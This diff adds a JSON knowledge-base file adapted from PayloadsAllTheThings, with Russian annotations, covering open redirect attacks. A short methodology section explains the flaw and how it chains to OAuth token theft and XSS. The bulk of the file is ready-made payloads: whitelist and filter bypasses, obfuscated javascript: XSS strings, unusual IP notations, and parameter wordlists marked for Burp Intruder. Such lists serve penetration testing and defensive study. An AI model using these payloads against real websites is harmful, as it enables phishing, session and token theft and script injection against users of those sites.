@@ -1,0 +1,232 @@
+{
+  "category": "Open Redirect",
+  "source": "PayloadsAllTheThings/Open Redirect/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое Open Redirect",
+      "language": "text",
+      "tags": ["methodology", "concept"],
+      "body": "Open Redirect возникает, когда приложение использует непроверенный пользовательский ввод, чтобы перенаправить пользователя на другой сайт. Атакующий формирует ссылку на уязвимый (доверенный) домен, которая редиректит жертву на подконтрольный ему вредоносный ресурс.\n\nИмя сервера в ссылке совпадает с настоящим сайтом, поэтому фишинг выглядит правдоподобно. Используется в фишинге, краже сессий/токенов (через OAuth redirect_uri), а также для обхода проверок доступа и форвардинга на привилегированные функции.\n\nПример уязвимого редиректа:\nhttps://example.com/redirect?url=https://userpreferredsite.com\nАтакующий подменяет userpreferredsite.com на свой домен и рассылает ссылку в фишинге."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать и как тестировать",
+      "language": "text",
+      "tags": ["methodology", "recon", "how-to-test"],
+      "body": "• Любой параметр со значением-URL или путём: url, next, redirect, return, dest, continue, callback, redirect_uri (OAuth/OIDC/SSO).\n• Логаут/логин-флоу, кнопки «вернуться», сохранённая домашняя страница, шортлинки, трекинг-редиректы.\n• Редирект может быть на сервере (заголовок Location, коды 3xx) или на клиенте (window.location, meta refresh, JS-переменная) — DOM-based.\n• Подставь свой домен и смотри: ушёл ли Location/перешёл ли браузер на чужой хост.\n• Если есть whitelist — пробуй обходы: //, @, поддомен своего домена как подпапка/субдомен доверенного, backslash, тройной слэш, URL-энкод точки/слэша, нулевой байт, IP в нестандартных нотациях, Unicode-нормализацию.\n• Связки: Open Redirect → кража OAuth-токена/кода, обход SSRF-фильтров, цепочка с XSS через javascript:/data:."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "HTTP-коды перенаправления (3xx)",
+      "language": "table",
+      "tags": ["methodology", "http", "status-code"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Код", "Назначение"],
+          "rows": [
+            ["300 Multiple Choices", "У запроса несколько возможных ответов, клиент выбирает один"],
+            ["301 Moved Permanently", "Ресурс перемещён навсегда на URL из заголовка Location"],
+            ["302 Found", "Ресурс временно находится по URL из Location (метод может смениться)"],
+            ["303 See Other", "Получить ресурс по другому URI через GET"],
+            ["304 Not Modified", "Кэш: ответ не изменился, использовать сохранённую версию"],
+            ["305 Use Proxy", "Доступ к ресурсу через прокси из заголовка Location"],
+            ["307 Temporary Redirect", "Временный редирект на URL из Location, метод сохраняется"],
+            ["308 Permanent Redirect", "Постоянный редирект на URL из Location, метод сохраняется"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Способы редиректа: путь и JavaScript",
+      "language": "text",
+      "tags": ["methodology", "path-based", "dom-based"],
+      "body": "Path-based — логика редиректа берётся из пути, а не из query:\nhttps://example.com/redirect/http://malicious.com\nhttps://example.com/redirect/../http://malicious.com\n\nJavaScript-based (DOM) — приложение редиректит через JS, манипулируем переменной:\nvar redirectTo = \"http://trusted.com\";\nwindow.location = redirectTo;\nPayload: ?redirectTo=http://malicious.com"
+    },
+    {
+      "subcategory": "Параметры",
+      "title": "Типовые query-параметры для редиректа",
+      "language": "text",
+      "tags": ["parameters", "fuzzing", "query"],
+      "body": "?checkout_url={payload}\n?continue={payload}\n?dest={payload}\n?destination={payload}\n?go={payload}\n?image_url={payload}\n?next={payload}\n?redir={payload}\n?redirect_uri={payload}\n?redirect_url={payload}\n?redirect={payload}\n?return_path={payload}\n?return_to={payload}\n?return={payload}\n?returnTo={payload}\n?rurl={payload}\n?target={payload}\n?url={payload}\n?view={payload}\n/{payload}\n/redirect/{payload}"
+    },
+    {
+      "subcategory": "Базовые",
+      "title": "Протокол-относительные (//) и обход \"http\"",
+      "language": "text",
+      "tags": ["basic", "protocol-relative", "filter-bypass"],
+      "body": "//google.com\n////google.com"
+    },
+    {
+      "subcategory": "Базовые",
+      "title": "https: без слэшей — обход фильтра \"//\"",
+      "language": "text",
+      "tags": ["basic", "scheme", "filter-bypass"],
+      "body": "https:google.com"
+    },
+    {
+      "subcategory": "Базовые",
+      "title": "Базовые редиректы на внешний хост",
+      "language": "text",
+      "tags": ["basic", "payload"],
+      "body": "/http://example.com\n/http:/example.com\n//example.com\n//example.com/\n///example.com\n///example.com/\n/////example.com\n/////example.com/"
+    },
+    {
+      "subcategory": "Обход whitelist",
+      "title": "Поддомен/подпапка как доверенный домен",
+      "language": "text",
+      "tags": ["whitelist-bypass", "phishing"],
+      "body": "www.whitelisted.com.evil.com   редиректит на evil.com\n\n# Доверенный домен как папка/префикс пути (хост остаётся вашим):\nhttp://www.yoursite.com/http://www.theirsite.com/\nhttp://www.yoursite.com/folder/www.folder.com"
+    },
+    {
+      "subcategory": "Обход whitelist",
+      "title": "Символ @ — реальный хост идёт после @ (RFC 1738)",
+      "language": "text",
+      "tags": ["whitelist-bypass", "at-sign", "userinfo"],
+      "body": "//<user>:<password>@<host>:<port>/<url-path>\nhttp://www.theirsite.com@yoursite.com/"
+    },
+    {
+      "subcategory": "Обход whitelist",
+      "title": "Символ ? — браузер трактует как /?",
+      "language": "text",
+      "tags": ["whitelist-bypass", "question-mark"],
+      "body": "http://www.yoursite.com?http://www.theirsite.com/\nhttp://www.yoursite.com?folder/www.folder.com"
+    },
+    {
+      "subcategory": "Обход whitelist",
+      "title": "Whitelist-домен + @ / # / & / \\ перед реальным хостом",
+      "language": "text",
+      "tags": ["whitelist-bypass", "at-sign", "parsing"],
+      "body": "http://google.com:80#@www.whitelisteddomain.tld/\nhttp://google.com:80?@www.whitelisteddomain.tld/\nhttp://google.com\\www.whitelisteddomain.tld\nhttp://google.com&www.whitelisteddomain.tld\nhttp://www.whitelisteddomain.tld.google.com\nhttp://www.whitelisteddomain.tld/https://www.google.com/\n//google.com\\@www.whitelisteddomain.tld\nhttps://:@google.com\\@www.whitelisteddomain.tld"
+    },
+    {
+      "subcategory": "Обход whitelist",
+      "title": "HTTP Parameter Pollution",
+      "language": "text",
+      "tags": ["whitelist-bypass", "hpp", "parameter-pollution"],
+      "body": "?next=whitelisted.com&next=google.com"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Backslash-трюки — обход фильтра \"//\"",
+      "language": "text",
+      "tags": ["filter-bypass", "backslash"],
+      "body": "\\/\\/google.com/\n/\\/google.com/\n\\\\google.com"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Закодированный backslash (%5c) + комбинации слэшей",
+      "language": "text",
+      "tags": ["filter-bypass", "backslash", "url-encode"],
+      "body": "/%5cexample.com\n//%5cexample.com\n///%5cexample.com\n////%5cexample.com\nhttps://%5cgoogle.com\n/https://%5cgoogle.com\n/https:/%5cexample.com/"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Тройной/множественный слэш + path-traversal суффикс",
+      "language": "text",
+      "tags": ["filter-bypass", "triple-slash", "path-traversal"],
+      "body": "///google.com/%2f..\n////google.com/%2f..\n//example.com/%2f%2e%2e\n///example.com/%2f%2e%2e\n////example.com/%2f%2e%2e\n//example.com/%2e%2e\n//example.com/%2e%2e%2f\n//example.com//\n///example.com//\n////example.com//\nhttps:///www.google.com/%2e%2e\nhttps:///www.google.com/%2f%2e%2e"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Закодированный TAB (%09) внутри хоста",
+      "language": "text",
+      "tags": ["filter-bypass", "url-encode", "whitespace"],
+      "body": "/%09/google.com\n//%09/google.com\n///%09/google.com\n////%09/google.com\nhttps://%09/google.com\n/https://%09/example.com"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "URL-энкод всего payload — обход keyword-фильтров",
+      "language": "text",
+      "tags": ["filter-bypass", "url-encode", "obfuscation"],
+      "body": "# %68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d = http://google.com\n%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d\nhttp://%67%6f%6f%67%6c%65%2e%63%6f%6d\n/http://%67%6f%6f%67%6c%65%2e%63%6f%6d\n/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d\n/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Юникодная точка %E3%80%82 — обход фильтра \".\"",
+      "language": "text",
+      "tags": ["filter-bypass", "unicode", "ideographic-dot"],
+      "body": "/?redir=google。com\n//google%E3%80%82com"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Нулевой байт %00 — обход blacklist-фильтра",
+      "language": "text",
+      "tags": ["filter-bypass", "null-byte"],
+      "body": "//google%00.com"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Host/Split Unicode Normalization",
+      "language": "text",
+      "tags": ["filter-bypass", "unicode", "normalization"],
+      "body": "https://evil.c℀.example.com   --->   https://evil.ca/c.example.com\nhttp://a.com／X.b.com"
+    },
+    {
+      "subcategory": "Обход фильтров",
+      "title": "Unicode-символы, нормализуемые к точке/слэшу",
+      "language": "text",
+      "tags": ["filter-bypass", "unicode", "idna"],
+      "body": "〱google.com\n〵google.com\nゝgoogle.com\nーgoogle.com\nｰgoogle.com\n/〱google.com\n/〵google.com\n/ゝgoogle.com\n/ーgoogle.com\n/ｰgoogle.com"
+    },
+    {
+      "subcategory": "CRLF и схемы",
+      "title": "CRLF для обхода фильтра \"javascript\"",
+      "language": "text",
+      "tags": ["crlf", "filter-bypass", "javascript"],
+      "body": "java%0d%0ascript%0d%0a:alert(0)"
+    },
+    {
+      "subcategory": "CRLF и схемы",
+      "title": "javascript: схема — XSS через редирект",
+      "language": "text",
+      "tags": ["javascript", "xss", "scheme"],
+      "body": "javascript:alert(1);\njavascript:alert(1)\n//javascript:alert(1);\n/javascript:alert(1);\n//javascript:alert(1)\n/javascript:alert(1)\n/%5cjavascript:alert(1);\n//%5cjavascript:alert(1);\n/%09/javascript:alert(1);\n<>javascript:alert(1);"
+    },
+    {
+      "subcategory": "CRLF и схемы",
+      "title": "javascript: с обфускацией (CRLF, escape, octal/unicode)",
+      "language": "text",
+      "tags": ["javascript", "xss", "obfuscation"],
+      "body": "javascript://www.whitelisteddomain.tld?%a0alert%281%29\n\";alert(0);//\n\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)\n\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)\nja\\nva\\tscript\\r:alert(1)\n\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)\n\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)"
+    },
+    {
+      "subcategory": "IP-нотации",
+      "title": "Хост в нестандартных IP-нотациях (decimal/hex/octal/IPv6)",
+      "language": "text",
+      "tags": ["ip-encoding", "whitelist-bypass", "ssrf"],
+      "body": "# Все варианты ниже = 216.58.214.206\nhttp://0xd8.0x3a.0xd6.0xce\nhttp://0xd83ad6ce\nhttp://3627734734\nhttp://472.314.470.462\nhttp://0330.072.0326.0316\nhttp://00330.00072.0000326.00000316\nhttp://[::216.58.214.206]\nhttp://[::ffff:216.58.214.206]\nhttp://0xd8.072.54990\nhttp://0xd8.3856078\nhttp://00330.3856078\nhttp://00330.0x3a.54990"
+    },
+    {
+      "subcategory": "IP-нотации",
+      "title": "IP-нотации с whitelist-доменом в userinfo (@)",
+      "language": "text",
+      "tags": ["ip-encoding", "at-sign", "whitelist-bypass"],
+      "body": "http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce\nhttp://www.whitelisteddomain.tld@0xd83ad6ce\nhttp://www.whitelisteddomain.tld@3627734734\nhttp://www.whitelisteddomain.tld@472.314.470.462\nhttp://www.whitelisteddomain.tld@0330.072.0326.0316\nhttp://www.whitelisteddomain.tld@[::216.58.214.206]\nhttp://www.whitelisteddomain.tld@[::ffff:216.58.214.206]"
+    },
+    {
+      "subcategory": "IP-нотации",
+      "title": "IP-нотации со схемой http: без // (обход \"//\")",
+      "language": "text",
+      "tags": ["ip-encoding", "scheme", "filter-bypass"],
+      "body": "http:0xd8.0x3a.0xd6.0xce\nhttp:0xd83ad6ce\nhttp:3627734734\nhttp:472.314.470.462\nhttp:0330.072.0326.0316\nhttp:[::216.58.214.206]\nhttp:[::ffff:216.58.214.206]"
+    },
+    {
+      "subcategory": "Готовые списки",
+      "title": "Whitelist bypass с @ и суффиксом %2f.. (для Intruder)",
+      "language": "text",
+      "tags": ["wordlist", "whitelist-bypass", "intruder"],
+      "body": "//google.com/%2f..\n//www.whitelisteddomain.tld@google.com/%2f..\n///google.com/%2f..\n///www.whitelisteddomain.tld@google.com/%2f..\n////google.com/%2f..\n////www.whitelisteddomain.tld@google.com/%2f..\nhttps://google.com/%2f..\nhttps://www.whitelisteddomain.tld@google.com/%2f..\n/https://google.com/%2f..\n/https://www.whitelisteddomain.tld@google.com/%2f..\n//google.com/\n//www.whitelisteddomain.tld@google.com/\nhttps://google.com/\nhttps://www.whitelisteddomain.tld@google.com/\nhttps://google.com\nhttps://www.whitelisteddomain.tld@google.com"
+    },
+    {
+      "subcategory": "Готовые списки",
+      "title": "Мульти-параметр payload (url/next/redirect/redir/rurl)",
+      "language": "text",
+      "tags": ["wordlist", "parameters", "intruder"],
+      "body": "/?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com\n/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com\n/?url=/\\/example.com&next=/\\/example.com&redirect=/\\/example.com&redirect_uri=/\\/example.com\n/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com\n/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com\n/redirect?url=/\\/example.com&next=/\\/example.com&redirect=/\\/example.com&redir=/\\/example.com&rurl=/\\/example.com&redirect_uri=/\\/example.com\n/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com"
+    }
+  ]
+}
